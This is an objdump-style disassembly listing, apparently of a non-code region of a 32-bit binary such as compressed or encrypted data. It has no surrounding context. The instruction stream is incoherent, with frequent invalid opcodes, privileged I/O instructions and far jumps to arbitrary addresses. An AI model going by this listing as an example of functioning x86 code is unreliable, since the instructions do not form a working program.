  41e3d7:	sub    eax,0x2eda845c
  41e3dc:	add    BYTE PTR [eax+0x6da99998],bh
  41e3e2:	out    dx,al
  41e3e3:	mov    ds:0xb3065b19,al
  41e3e8:	or     edi,edx
  41e3ea:	xlat   BYTE PTR ds:[ebx]
  41e3eb:	add    cl,al
  41e3ed:	neg    ch
  41e3ef:	int3   
  41e3f0:	xor    esi,DWORD PTR [eax]
  41e3f2:	ins    DWORD PTR es:[edi],dx
  41e3f3:	lds    edx,FWORD PTR [esi]
  41e3f5:	fnsave [edx+0x60]
  41e3f8:	cmp    eax,0x346a826c
  41e3fd:	pop    esp
  41e3fe:	ss (bad) 
  41e400:	clc    
  41e401:	loope  0x41e47d
  41e403:	xchg   edx,eax
  41e404:	or     edi,DWORD PTR [ebx+0x61]
  41e407:	ja     0x41e39f
  41e409:	enter  0xb6d2,0xf
  41e40d:	imul   ebp,DWORD PTR [ebp+0x56],0x12a3969c
  41e414:	and    dl,ah
  41e416:	scas   al,BYTE PTR es:[edi]
  41e417:	stos   DWORD PTR es:[edi],eax
  41e418:	ret    
  41e419:	arpl   WORD PTR [ecx],cx
  41e41b:	adc    DWORD PTR [ebp-0x26],ebp
  41e41e:	ja     0x41e42f
  41e420:	add    dh,ch
  41e422:	dec    edx
  41e423:	cmp    BYTE PTR [ebx+ecx*1-0x210c5427],ch
  41e42a:	adc    BYTE PTR [edx],ah
  41e42c:	test   eax,0x3a5b22bc
  41e431:	test   al,0x84
  41e433:	mov    al,0x4f
  41e435:	xchg   edx,eax
  41e436:	xchg   BYTE PTR [ecx+ebx*4+0x27472410],ch
  41e43d:	sahf   
  41e43e:	mov    BYTE PTR [ebx],ch
  41e440:	jae    0x41e45e
  41e442:	inc    eax
  41e443:	(bad)  
  41e444:	(bad)  
  41e445:	xchg   edx,eax
  41e446:	and    DWORD PTR [ebx],esp
  41e448:	cmp    eax,0x978a1910
  41e44d:	(bad)
  41e451:	fsubp  st(7),st
  41e453:	das    
  41e454:	pop    ebx
  41e455:	mov    ebx,0x9557f9e9
  41e45a:	into   
  41e45b:	leave  
  41e45c:	xchg   BYTE PTR [eax+esi*8+0xe],dh
  41e460:	sub    ah,ch
  41e462:	ins    DWORD PTR es:[edi],dx
  41e463:	leave  
  41e464:	(bad)  
  41e465:	lods   eax,DWORD PTR ds:[esi]
  41e466:	lea    eax,[ecx]
  41e468:	dec    esi
  41e469:	mov    ebp,0x7de05a84
  41e46e:	xor    BYTE PTR [si+0x632],cl
  41e473:	mov    ebx,0x59355f74
  41e478:	mov    DWORD PTR [ecx-0x2b],esi
  41e47b:	(bad)  
  41e47d:	(bad)  [esi+0x0]
  41e480:	jmp    0xa05b:0x4f48b2c6
  41e487:	imul   edx,DWORD PTR [ecx],0x2
  41e48a:	adc    ch,BYTE PTR [ebp-0x7ad01ae9]
  41e490:	jg     0x41e484
  41e492:	(bad)  
  41e493:	addr16 mov al,ds:0xfe94
  41e497:	stc    
  41e498:	fiadd  WORD PTR [edx-0x2c]
  41e49b:	call   0xc6b1:0x83726943
  41e4a2:	mov    ecx,0xbb52d12d
  41e4a7:	nop
  41e4a8:	pop    ebx
  41e4a9:	jae    0x41e43e
  41e4ab:	mov    cl,0xeb
  41e4ad:	or     al,0x8
  41e4af:	push   es
  41e4b0:	sub    dl,BYTE PTR [esi]
  41e4b2:	mov    ch,0xa2
  41e4b4:	xchg   DWORD PTR [edi-0x1e3c096],edx
  41e4ba:	xchg   BYTE PTR ds:[ecx-0x630583eb],bh
  41e4c1:	mov    edx,0x4842681a
  41e4c6:	fist   WORD PTR [esi]
  41e4c8:	pop    edi
  41e4c9:	add    DWORD PTR [bx+0x1e91],esi
  41e4ce:	cmp    DWORD PTR [eax-0x71],ebx
  41e4d1:	push   ebp
  41e4d2:	dec    BYTE PTR [edx]
  41e4d4:	hlt    
  41e4d5:	add    esi,esp
  41e4d7:	aaa    
  41e4d8:	mul    DWORD PTR ds:[eax-0x4c]
  41e4dc:	mov    BYTE PTR [ebx],0x5e
  41e4df:	dec    ebp
  41e4e0:	call   0xc12cf6ee
  41e4e5:	lds    ecx,FWORD PTR [eax-0x18595285]
  41e4eb:	pop    ecx
  41e4ec:	mov    ebx,0xa5d67a99
  41e4f1:	daa    
  41e4f2:	inc    esi
  41e4f3:	sub    dl,dl
  41e4f5:	sti    
  41e4f6:	mov    esp,0xf63da5d6
  41e4fb:	je     0x41e4d9
  41e4fd:	retf   
  41e4fe:	sbb    dh,BYTE PTR [eax-0x65]
  41e501:	jmp    esi
  41e503:	fldl2t 
  41e505:	(bad)  
  41e506:	imul   edx,ecx,0xffffffc4
  41e509:	mov    DWORD PTR [ebp-0x10a5fa93],eax
  41e50f:	daa    
  41e510:	in     al,0x9d
  41e512:	or     BYTE PTR [ebx+edx*4+0x549f4143],dl
  41e519:	adc    al,0x92
  41e51b:	nop
  41e51c:	rol    BYTE PTR [esi],cl
  41e51e:	pop    ebp
  41e51f:	cmp    dl,BYTE PTR [edx+0x68]
  41e522:	and    DWORD PTR [eax+0x1d5bfe0c],eax
  41e528:	fidivr DWORD PTR [ecx-0x10736dc3]
  41e52e:	pop    ebp
  41e52f:	push   ebp
  41e530:	jbe    0x41e555
  41e532:	lods   al,BYTE PTR ds:[esi]
  41e533:	mov    ecx,0x1426c7d4
  41e538:	(bad)  
  41e539:	cmc    
  41e53a:	push   edi
  41e53b:	(bad)  [edi+0x5a]
  41e53e:	(bad)  
  41e53f:	xor    bl,bl
  41e541:	imul   esp,DWORD PTR [eax+0x3c],0x16d85b2f
  41e548:	(bad)  
  41e549:	bound  eax,QWORD PTR [esi-0x668b014c]
  41e54f:	outs   dx,DWORD PTR ds:[esi]
  41e550:	in     al,0x7f
  41e552:	inc    esp
  41e553:	mov    ah,0x60
  41e555:	imul   eax,DWORD PTR [edi],0xb5069063
  41e55b:	push   edx
  41e55c:	out    dx,eax
  41e55d:	ins    BYTE PTR es:[edi],dx
  41e55e:	call   0xb2b5:0x648670a1
  41e565:	lds    esp,FWORD PTR [ecx]
  41e567:	xchg   BYTE PTR [ebp-0x3fed37e7],dh
  41e56d:	leave  
  41e56e:	adc    al,0x10
  41e570:	aam    0xf0
  41e572:	xor    al,0x60
  41e574:	pop    es
  41e575:	mov    ah,0x51
  41e577:	sub    al,0x6d
  41e579:	push   esi
  41e57a:	cmp    BYTE PTR [ebp+0x4a3d4baa],al
  41e580:	mov    ds:0x1290dd15,al
  41e585:	call   0x98d7e733
  41e58a:	enter  0xd4fd,0xa5
  41e58e:	je     0x41e5db
  41e590:	(bad)  
  41e591:	sub    bh,BYTE PTR [ecx-0x6b]
  41e594:	cmp    eax,0x4316967f
  41e599:	mov    ch,0x50
  41e59b:	pop    edx
  41e59c:	mov    al,0x46
  41e59e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e59f:	ret    
  41e5a0:	loope  0x41e5af
  41e5a2:	stos   DWORD PTR es:[edi],eax
  41e5a3:	mov    ecx,DWORD PTR [edi+0x18]
  41e5a6:	cmp    al,0xb8
  41e5a8:	push   es
  41e5a9:	(bad)  
  41e5aa:	iret   
  41e5ab:	push   es
  41e5ac:	in     al,0x1b
  41e5ae:	pushf  
  41e5af:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e5b0:	arpl   WORD PTR [edx-0x3b],ax
  41e5b3:	mov    dh,0x60
  41e5b5:	dec    esi
  41e5b6:	xchg   esp,eax
  41e5b7:	cmp    edx,ebp
  41e5b9:	mov    al,0x64
  41e5bb:	push   ds
  41e5bc:	mov    al,ds:0xd6041441
  41e5c1:	mov    dh,0xae
  41e5c3:	mov    ebp,DWORD PTR [ebx]
  41e5c5:	push   esp
  41e5c6:	aas    
  41e5c7:	xor    eax,0xce7cb8f7
  41e5cc:	das    
  41e5cd:	mov    ecx,0xaddb9c49
  41e5d2:	jne    0x41e55c
  41e5d4:	mov    bh,0x6
  41e5d6:	jl     0x41e647
  41e5d8:	xchg   ecx,eax
  41e5d9:	mov    bl,0xfa
  41e5db:	add    ch,BYTE PTR [edi+0x68]
  41e5de:	xchg   edi,eax
  41e5df:	into   
  41e5e0:	sti    
  41e5e1:	addr16 jb 0x41e5b3
  41e5e4:	push   esi
  41e5e5:	add    al,0xb6
  41e5e7:	popf   
  41e5e8:	enter  0xaf48,0x1e
  41e5ec:	xchg   esp,eax
  41e5ed:	cmp    DWORD PTR ds:0x9a1ef6d5,edx
  41e5f3:	mov    esi,0x54c34486
  41e5f8:	pusha  
  41e5f9:	dec    esp
  41e5fa:	ret    
  41e5fb:	test   al,0x8c
  41e5fd:	ins    DWORD PTR es:[edi],dx
  41e5fe:	mov    ch,BYTE PTR [edx-0x32]
  41e601:	lahf   
  41e602:	dec    esi
  41e603:	pop    eax
  41e604:	(bad)  
  41e605:	sbb    DWORD PTR [esi],ebp
  41e607:	repnz retf 
  41e609:	daa    
  41e60a:	jnp    0x41e5a7
  41e60c:	pop    ecx
  41e60d:	jmp    0xe0bb:0x4abdd0e3
  41e614:	dec    ecx
  41e615:	jp     0x41e5f9
  41e617:	call   0xc56e:0x679940f1
  41e61e:	rcr    DWORD PTR [esi],0x99
  41e621:	imul   esp,DWORD PTR [ebx],0xa2d17aa6
  41e627:	(bad)  [ebx+0x7269555e]
  41e62d:	mov    al,ds:0xbe5cd3d5
  41e632:	adc    eax,DWORD PTR [esi+eax*4+0x1e]
  41e636:	out    0x8c,al
  41e638:	mov    ds:0xd3db81e1,al
  41e63d:	pop    ss
  41e63e:	jae    0x41e6b1
  41e640:	in     eax,0x8d
  41e642:	outs   dx,BYTE PTR ds:[esi]
  41e643:	pop    ecx
  41e644:	push   ecx
  41e645:	cmp    BYTE PTR [esi+ebp*4-0x244ed86b],0x6b
  41e64d:	cli    
  41e64e:	mov    BYTE PTR [edx+esi*1-0x7ff15639],bh
  41e655:	outs   dx,BYTE PTR ds:[esi]
  41e656:	pop    edi
  41e657:	std    
  41e658:	retf   
  41e659:	and    eax,0xc2b39d70
  41e65e:	add    edi,ebp
  41e660:	popf   
  41e661:	outs   dx,BYTE PTR ds:[esi]
  41e662:	fcomp  DWORD PTR [eax-0x5e]
  41e665:	addr16 pushf 
  41e667:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e668:	xor    bh,BYTE PTR [edx-0x4]
  41e66b:	add    ch,dh
  41e66d:	pop    ebx
  41e66e:	adc    dl,BYTE PTR [edx]
  41e670:	mov    cl,0x59
  41e672:	adc    al,0xe
  41e674:	pop    edx
  41e675:	das    
  41e676:	stc    
  41e677:	popf   
  41e678:	dec    edi
  41e679:	inc    edi
  41e67a:	push   esi
  41e67b:	mov    edi,edx
  41e67d:	mov    edx,0x268b81fa
  41e682:	ins    BYTE PTR es:[edi],dx
  41e683:	imul   ebp,DWORD PTR [esi-0x7f],0xfc0eed69
  41e68a:	mov    BYTE PTR [ebx+edi*4],ch
  41e68d:	inc    esp
  41e68e:	jle    0x41e6ae
  41e690:	std    
  41e691:	cmc    
  41e692:	fwait
  41e693:	cmp    eax,0x4d5d758f
  41e698:	loop   0x41e644
  41e69a:	push   edx
  41e69b:	(bad)  
  41e69c:	int    0x8f
  41e69e:	cmp    ebx,esi
  41e6a0:	xchg   edx,eax
  41e6a1:	xor    al,0x14
  41e6a3:	call   DWORD PTR [ecx]
  41e6a5:	mov    ch,0x6
  41e6a7:	loopne 0x41e66e
  41e6a9:	adc    DWORD PTR [ecx+0x18],eax
  41e6ac:	push   esi
  41e6ad:	enter  0xee78,0x36
  41e6b1:	in     eax,dx
  41e6b2:	inc    edi
  41e6b3:	arpl   WORD PTR [ebp-0x2280073c],si
  41e6b9:	in     al,dx
  41e6ba:	repnz test al,0x8f
  41e6bd:	and    DWORD PTR [ebp-0x470afa41],ebx
  41e6c3:	and    eax,0x79d57f34
  41e6c8:	inc    edi
  41e6c9:	in     al,0x36
  41e6cb:	fmul   DWORD PTR [ecx+esi*4-0x6fa3002]
  41e6d2:	dec    ebx
  41e6d3:	adc    al,0x3f
  41e6d5:	jecxz  0x41e6a7
  41e6d7:	pop    ebp
  41e6d8:	iret   
  41e6d9:	mov    WORD PTR [bp+si+0xf],fs
  41e6dd:	(bad)  
  41e6de:	pop    ss
  41e6df:	call   FWORD PTR [edi-0x12]
  41e6e2:	push   ebx
  41e6e3:	dec    ebp
  41e6e4:	stc    
  41e6e5:	cwde   
  41e6e6:	je     0x41e71a
  41e6e8:	cmp    eax,0xd6d33455
  41e6ed:	das    
  41e6ee:	test   eax,0x54345d21
  41e6f3:	jbe    0x41e69d
  41e6f5:	or     bh,BYTE PTR [eax-0x5111549d]
  41e6fb:	dec    DWORD PTR [ebp+0x11]
  41e6fe:	or     bh,BYTE PTR [eax+edi*2]
  41e701:	rol    ebp,1
  41e703:	jmp    0x751f:0x42485277
  41e70a:	test   DWORD PTR [esi],0x1f22e64f
  41e710:	dec    edx
  41e711:	pop    es
  41e712:	cmp    DWORD PTR [edi+0x11],ebp
  41e715:	xchg   edi,eax
  41e716:	das    
  41e717:	add    BYTE PTR [ebx-0x2],0x7d
  41e71b:	adc    DWORD PTR [edi],0x6b7fcc3f
  41e721:	sbb    esp,ebp
  41e723:	lods   al,BYTE PTR ds:[esi]
  41e724:	mov    dl,0x74
  41e726:	pop    ecx
  41e727:	outs   dx,DWORD PTR ds:[esi]
  41e728:	jnp    0x41e6b1
  41e72a:	lahf   
  41e72b:	jns    0x41e712
  41e72d:	ds aaa 
  41e72f:	jbe    0x41e6e3
  41e731:	jbe    0x41e77e
  41e733:	pop    edi
  41e734:	sub    eax,0xf4dc8190
  41e739:	into   
  41e73a:	or     DWORD PTR [ebx+ebp*1+0x1cc04531],ecx
  41e741:	sahf   
  41e742:	mov    ebp,0xb33270f3
  41e747:	cmp    ch,BYTE PTR fs:[ecx-0xd]
  41e74b:	xchg   ecx,eax
  41e74c:	in     al,0x40
  41e74e:	pushf  
  41e74f:	mov    ah,0xee
  41e751:	or     ebx,DWORD PTR [ebx-0x35]
  41e754:	push   esp
  41e755:	fbld   TBYTE PTR [edi-0x34]
  41e758:	aam    0xba
  41e75a:	(bad)  
  41e75b:	xor    eax,0x12d292da
  41e760:	lea    ebp,ds:0x8bdb587f
  41e766:	adc    edi,eax
  41e768:	sub    eax,0xa91c616b
  41e76d:	mov    bh,0xe7
  41e76f:	iret   
  41e770:	jecxz  0x41e7b5
  41e772:	inc    ebx
  41e773:	retf   
  41e774:	pop    es
  41e775:	mov    eax,ds:0x83a066c2
  41e77a:	mul    BYTE PTR [edi]
  41e77c:	push   ecx
  41e77d:	fisttp DWORD PTR [eax-0x29]
  41e780:	hlt    
  41e781:	dec    esi
  41e782:	pop    ss
  41e783:	adc    DWORD PTR [ecx+eiz*2],esp
  41e786:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e787:	cwde   
  41e788:	push   ecx
  41e789:	mov    al,ds:0x48c437d0
  41e78e:	add    DWORD PTR [ecx+0x4b93392b],esi
  41e794:	jp     0x41e7ee
  41e796:	xchg   esp,eax
  41e797:	jle    0x41e71b
  41e799:	sub    dx,WORD PTR [ecx]
  41e79c:	popa   
  41e79d:	cmc    
  41e79e:	repnz arpl WORD PTR [edx-0x47],si
  41e7a2:	test   DWORD PTR [ecx],ebx
  41e7a4:	cmp    DWORD PTR [edx-0x29],edi
  41e7a7:	push   esp
  41e7a8:	inc    ebx
  41e7a9:	(bad)  
  41e7aa:	fadd   QWORD PTR [ecx+edx*8-0x78e6730f]
  41e7b1:	es out 0xbc,eax
  41e7b4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e7b5:	dec    ecx
  41e7b6:	pusha  
  41e7b7:	adc    eax,0x510841a
  41e7bc:	in     eax,0x34
  41e7be:	dec    esp
  41e7bf:	dec    ebp
  41e7c0:	cmp    eax,DWORD PTR ds:[eax-0x27]
  41e7c4:	inc    ebx
  41e7c5:	int3   
  41e7c6:	jb     0x41e78f
  41e7c8:	dec    edi
  41e7c9:	clc    
  41e7ca:	ret    0x18f0
  41e7cd:	lods   al,BYTE PTR ds:[esi]
  41e7ce:	jae    0x41e80f
  41e7d0:	pop    esi
  41e7d1:	sbb    esp,DWORD PTR [esi+0x1eeb90fe]
  41e7d7:	retf   
  41e7d8:	jmp    0xd21f:0x7c1c7542
  41e7df:	imul   DWORD PTR [edi-0x45]
  41e7e2:	pop    ebp
  41e7e3:	(bad)  [edx]
  41e7e5:	call   0x69221539
  41e7ea:	shr    BYTE PTR [ecx+0x42],cl
  41e7ed:	das    
  41e7ee:	dec    edi
  41e7ef:	(bad)  
  41e7f0:	fs ja  0x41e84c
  41e7f3:	jnp    0x41e7b8
  41e7f5:	ficom  DWORD PTR [ecx]
  41e7f7:	sub    al,0xf
  41e7f9:	ror    dl,0xce
  41e7fc:	nop
  41e7fd:	je     0x41e848
  41e7ff:	push   ebx
  41e800:	loop   0x41e7b7
  41e802:	cld    
  41e803:	(bad)  
  41e804:	jb     0x41e78d
  41e806:	and    dh,BYTE PTR [edi+0x77cc60e4]
  41e80c:	pop    es
  41e80d:	aas    
  41e80e:	pop    esp
  41e80f:	fs sub al,0xd6
  41e812:	ss pop esp
  41e814:	mov    dl,0x71
  41e816:	pop    esi
  41e817:	in     eax,0x35
  41e819:	push   edx
  41e81a:	xchg   esp,eax
  41e81b:	jo     0x41e829
  41e81d:	push   edx
  41e81e:	into   
  41e81f:	push   ebp
  41e820:	icebp  
  41e821:	popf   
  41e822:	sar    BYTE PTR [ecx-0x21bbaaa3],cl
  41e828:	pop    edx
  41e829:	xor    bh,BYTE PTR [edx-0x75]
  41e82c:	mov    ?,WORD PTR [esp+ebp*2]
  41e82f:	test   eax,0x2860dbad
  41e834:	xchg   edi,eax
  41e835:	xor    al,0x18
  41e837:	pop    ebx
  41e838:	sub    dh,ah
  41e83a:	cmp    DWORD PTR [ebx+0x9],ebp
  41e83d:	jge    0x41e81a
  41e83f:	sub    BYTE PTR [ecx+0x6b],ah
  41e842:	inc    BYTE PTR [ebx+edx*1-0x7d]
  41e846:	mov    es,WORD PTR [ecx-0x4d526142]
  41e84c:	cmp    BYTE PTR [ecx+0x53a14d71],bh
  41e852:	clc    
  41e853:	inc    esp
  41e854:	bound  ebp,QWORD PTR [ecx+ecx*4-0x35e48ae0]
  41e85b:	ret    0xdde9
  41e85e:	inc    ebx
  41e85f:	daa    
  41e860:	jnp    0x41e8a9
  41e862:	pop    ebp
  41e863:	loopne 0x41e863
  41e865:	pushf  
  41e866:	xchg   DWORD PTR [ebx-0x7a3afe7],edi
  41e86c:	shr    ebp,cl
  41e86e:	inc    esi
  41e86f:	push   edx
  41e870:	fisubr DWORD PTR [eax-0xfc58552]
  41e876:	das    
  41e877:	loopne 0x41e80c
  41e879:	iret   
  41e87a:	scas   eax,DWORD PTR es:[edi]
  41e87b:	xchg   esp,eax
  41e87c:	scas   eax,DWORD PTR es:[edi]
  41e87d:	push   0x88a6b477
  41e882:	ret    
  41e883:	pop    eax
  41e884:	pop    edi
  41e885:	or     DWORD PTR [ebp-0x37],esi
  41e888:	jg     0x41e8e1
  41e88a:	sti    
  41e88b:	mov    edi,DWORD PTR [edi]
  41e88d:	sub    ch,ch
  41e88f:	jns    0x41e89e
  41e891:	mov    edi,0x7f68432f
  41e896:	add    bl,dh
  41e898:	mov    dh,ch
  41e89a:	(bad)  
  41e89b:	outs   dx,BYTE PTR ds:[esi]
  41e89c:	mov    ah,0x19
  41e89e:	out    0x16,al
  41e8a0:	jbe    0x41e91e
  41e8a2:	pop    esp
  41e8a3:	in     al,dx
  41e8a4:	xchg   edx,eax
  41e8a5:	mov    dl,0xf
  41e8a7:	(bad)  
  41e8a8:	out    dx,al
  41e8a9:	mov    esi,0xd8bb933a
  41e8ae:	aaa    
  41e8af:	mov    al,ds:0x1e19649
  41e8b4:	xchg   esp,eax
  41e8b5:	and    BYTE PTR [ebx-0x4e29567d],bl
  41e8bb:	aaa    
  41e8bc:	leave  
  41e8bd:	sbb    DWORD PTR [eax],ebp
  41e8bf:	mov    eax,ds:0x1f964678
  41e8c4:	(bad)  
  41e8c5:	mov    dl,0x3b
  41e8c7:	or     eax,esp
  41e8c9:	push   esi
  41e8ca:	sub    eax,0x2050dc3c
  41e8cf:	inc    ebx
  41e8d0:	pop    edx
  41e8d1:	int    0x63
  41e8d3:	xchg   bl,ch
  41e8d5:	and    eax,0x3bf5bff9
  41e8da:	push   ecx
  41e8db:	pop    ebx
  41e8dc:	test   eax,0xe00f58f3
  41e8e1:	mov    dh,0x44
  41e8e3:	add    eax,0x685de58c
  41e8e8:	rcl    DWORD PTR [edx+0x5adbc11a],0x4e
  41e8ef:	xchg   ebx,eax
  41e8f0:	outs   dx,BYTE PTR ds:[esi]
  41e8f1:	(bad)  
  41e8f2:	fcomp  QWORD PTR [esi-0xf95390e]
  41e8f8:	inc    esi
  41e8f9:	push   0xe20abaf1
  41e8fe:	sub    esi,edx
  41e900:	jns    0x41e899
  41e902:	pop    ebx
  41e903:	call   0x4e2819c2
  41e908:	addr16 mov ecx,0x2d6dc6e3
  41e90e:	sub    edx,eax
  41e910:	ss lock test al,0x8
  41e914:	imul   edi,DWORD PTR [edx],0xf14a1081
  41e91a:	push   ebx
  41e91b:	push   es
  41e91c:	push   ebx
  41e91d:	inc    esp
  41e91e:	cmp    DWORD PTR [edi+0x24],ecx
  41e921:	dec    ebp
  41e922:	pop    eax
  41e923:	cmp    al,ch
  41e925:	fild   QWORD PTR [esi+0x34bb2c36]
  41e92b:	lahf   
  41e92c:	push   esp
  41e92d:	mov    eax,ds:0xa5f02986
  41e932:	sub    BYTE PTR fs:[eax-0x404ec558],dl
  41e939:	pop    esi
  41e93a:	rcl    esi,0x5c
  41e93d:	dec    edi
  41e93e:	and    BYTE PTR [eax-0x64de7e89],ah
  41e944:	jae    0x41e8f0
  41e946:	pop    ds
  41e947:	mov    ss:0xe37d0977,al
  41e94d:	pop    ds
  41e94e:	cmp    DWORD PTR [edx+0x6eed21ea],esi
  41e954:	push   ecx
  41e955:	jnp    0x41e9ce
  41e957:	mov    DWORD PTR [ecx-0x14b0bd69],esp
  41e95d:	sti    
  41e95e:	aaa    
  41e95f:	push   esi
  41e960:	fwait
  41e961:	or     bh,al
  41e963:	sahf   
  41e964:	xchg   edx,eax
  41e965:	dec    eax
  41e966:	mov    al,BYTE PTR [edi]
  41e968:	ds nop
  41e96a:	and    al,0x30
  41e96c:	call   0x38c4:0x719ef19a
  41e973:	ins    DWORD PTR es:[edi],dx
  41e974:	push   ss
  41e975:	ds aas 
  41e977:	cmp    al,BYTE PTR [ebx]
  41e979:	js     0x41e92c
  41e97b:	enter  0xcb0a,0x35
  41e97f:	fidiv  WORD PTR [edi+0x25]
  41e982:	mov    ds:0x99367489,al
  41e987:	sti    
  41e988:	pop    ds
  41e989:	or     al,BYTE PTR ds:0x22cccb3e
  41e98f:	sub    bl,al
  41e991:	mov    ?,WORD PTR [edx-0x1f1c2f50]
  41e997:	das    
  41e998:	pop    ebx
  41e999:	inc    ebx
  41e99a:	sbb    cl,cl
  41e99c:	data16 jge 0x41e971
  41e99f:	mov    ds:0x9ca64ce9,al
  41e9a4:	pusha  
  41e9a5:	enter  0x253d,0x64
  41e9a9:	mov    eax,ds:0x228d3917
  41e9ae:	(bad)  
  41e9af:	fldenv [esi+0x327f20e8]
  41e9b5:	push   ecx
  41e9b6:	add    eax,0xdcb69e71
  41e9bb:	or     BYTE PTR [ebx-0xe],dh
  41e9be:	xor    ebp,DWORD PTR [ebx+eiz*4-0x45]
  41e9c2:	pop    ebx
  41e9c3:	outs   dx,BYTE PTR ds:[esi]
  41e9c4:	cmp    ch,dl
  41e9c6:	ret    0x79ff
  41e9c9:	inc    edx
  41e9ca:	pushf  
  41e9cb:	add    BYTE PTR [edi],cl
  41e9cd:	repz fadd st,st(3)
  41e9d0:	cmp    esi,DWORD PTR [ebp-0x4e]
  41e9d3:	push   esi
  41e9d4:	mov    eax,ds:0xc09513ec
  41e9d9:	xchg   edx,eax
  41e9da:	xchg   edx,eax
  41e9db:	sahf   
  41e9dc:	aam    0xe0
  41e9de:	push   eax
  41e9df:	xor    bl,cl
  41e9e1:	jo     0x41ea3a
  41e9e3:	mov    eax,0x91ac5d46
  41e9e8:	stos   BYTE PTR es:[edi],al
  41e9e9:	aad    0xc4
  41e9eb:	cli    
  41e9ec:	mov    ebp,0x80bae438
  41e9f1:	adc    bh,BYTE PTR [edi]
  41e9f3:	push   ss
  41e9f4:	add    DWORD PTR [ebp+edi*1-0x29],0x27
  41e9f9:	aad    0xfe
  41e9fb:	fsub   DWORD PTR [ebx-0x55]
  41e9fe:	push   eax
  41e9ff:	inc    eax
  41ea00:	sar    BYTE PTR [ebx-0x19433fb7],0x15
  41ea07:	pop    edx
  41ea08:	inc    ecx
  41ea09:	jae    0x41e9a4
  41ea0b:	popa   
  41ea0c:	jns    0x41e9f3
  41ea0e:	hlt    
  41ea0f:	xor    edx,esi
  41ea11:	dec    esi
  41ea12:	xlat   BYTE PTR ds:[ebx]
  41ea13:	ret    
  41ea14:	add    BYTE PTR [ecx-0x1c],dh
  41ea17:	cli    
  41ea18:	test   DWORD PTR [esi-0x16ab3b7d],0xb95b0545
  41ea22:	dec    ebx
  41ea23:	cs inc ebx
  41ea25:	and    bh,BYTE PTR [ebp+0x16]
  41ea28:	fwait
  41ea29:	mov    ecx,DWORD PTR [esi+0x7688829f]
  41ea2f:	xchg   ebp,esi
  41ea31:	adc    edx,DWORD PTR [eax+0xcd0db]
  41ea37:	(bad)  [ecx+0x171fbc32]
  41ea3d:	add    DWORD PTR [edx-0x1e549760],edi
  41ea43:	mov    esp,0x6b3f7323
  41ea48:	lea    esi,[ecx-0x43]
  41ea4b:	dec    edx
  41ea4c:	xchg   edx,eax
  41ea4d:	pop    edi
  41ea4e:	mov    eax,ds:0x568d65c
  41ea53:	shl    BYTE PTR [eax-0x154fd15],1
  41ea59:	aad    0xf4
  41ea5b:	sbb    eax,0x45ec1164
  41ea60:	pop    ecx
  41ea61:	loop   0x41ea9b
  41ea63:	pop    esi
  41ea64:	inc    edx
  41ea65:	(bad)  
  41ea66:	adc    eax,0xe2acf33e
  41ea6b:	in     al,0xb7
  41ea6d:	ja     0x41ea78
  41ea6f:	call   0x7ef6:0xd495d673
  41ea76:	mov    cl,0x9c
  41ea78:	and    edx,ecx
  41ea7a:	arpl   WORD PTR [eax-0x3b4798f5],cx
  41ea80:	rol    DWORD PTR [ebp-0xa4ad44a],cl
  41ea86:	fadd   QWORD PTR [edi+eiz*1-0x2a]
  41ea8a:	ficom  WORD PTR [ecx+0x46]
  41ea8d:	out    dx,al
  41ea8e:	fsubr  st(4),st
  41ea90:	mov    bl,0x5f
  41ea92:	cli    
  41ea93:	or     ch,BYTE PTR [esi-0x4e5d8d67]
  41ea99:	jne    0x41eb03
  41ea9b:	es jae 0x41eaf7
  41ea9e:	pop    esp
  41ea9f:	pop    eax
  41eaa0:	or     DWORD PTR [edi-0x92032e7],ebp
  41eaa6:	lahf   
  41eaa7:	ror    BYTE PTR [ebp-0x7b],1
  41eaaa:	and    edx,ebx
  41eaac:	std    
  41eaad:	push   0x33847dd
  41eab2:	or     DWORD PTR [ecx],eax
  41eab4:	dec    edi
  41eab5:	in     eax,0xad
  41eab7:	ret    0x1d34
  41eaba:	ss push esi
  41eabc:	inc    esi
  41eabd:	xlat   BYTE PTR ds:[ebx]
  41eabe:	iret   
  41eabf:	lahf   
  41eac0:	scas   al,BYTE PTR es:[edi]
  41eac1:	aam    0x92
  41eac3:	cmp    DWORD PTR [ebx+0x21736ed0],esp
  41eac9:	xor    eax,0x2f649803
  41eace:	lods   eax,DWORD PTR ds:[esi]
  41eacf:	js     0x41eb0a
  41ead1:	aad    0x42
  41ead3:	sub    ecx,0x5a38c289
  41ead9:	je     0x41ea7a
  41eadb:	inc    ecx
  41eadc:	sbb    edi,DWORD PTR [esi+0xa631920]
  41eae2:	pushf  
  41eae3:	fisttp QWORD PTR [eax-0x45facc40]
  41eae9:	sti    
  41eaea:	xor    esi,ebp
  41eaec:	(bad)  
  41eaed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41eaee:	retf   0x36d9
  41eaf1:	mov    bl,0x8f
  41eaf3:	or     eax,esp
  41eaf5:	mov    bh,0x6d
  41eaf7:	enter  0x30a0,0xd9
  41eafb:	fwait
  41eafc:	sbb    eax,0x7fb59793
  41eb01:	ror    DWORD PTR [eax+0x31],0x8a
  41eb05:	pop    es
  41eb06:	cmp    BYTE PTR [ecx+0x78],al
  41eb09:	cmp    al,BYTE PTR [eax]
  41eb0b:	outs   dx,BYTE PTR ds:[esi]
  41eb0c:	das    
  41eb0d:	mov    edi,0xe1757426
  41eb12:	cmp    ch,BYTE PTR [bp+di-0x3c]
  41eb16:	pop    ss
  41eb17:	shl    esp,1
  41eb19:	test   al,0x99
  41eb1b:	mov    ebx,DWORD PTR [edx]
  41eb1d:	les    ecx,FWORD PTR [edx-0x49575e6e]
  41eb23:	and    DWORD PTR [esi],esp
  41eb25:	lods   eax,DWORD PTR ds:[esi]
  41eb26:	or     edi,DWORD PTR [edx+0x13]
  41eb29:	and    eax,0xf487bd65
  41eb2e:	dec    edi
  41eb2f:	lds    esi,FWORD PTR [eax]
  41eb31:	stc    
  41eb32:	ds add dl,dh
  41eb35:	jns    0x41eb42
  41eb37:	loopne 0x41eaf7
  41eb39:	fnstcw WORD PTR [esp+ebp*4-0x66]
  41eb3d:	ds mov bh,0xa5
  41eb40:	call   0x3e6b6693
  41eb45:	test   DWORD PTR [edx+0x2dd1495d],0xbcefbbce
  41eb4f:	jge    0x41eb4f
  41eb51:	xchg   ecx,eax
  41eb52:	ret    0x333c
  41eb55:	dec    edx
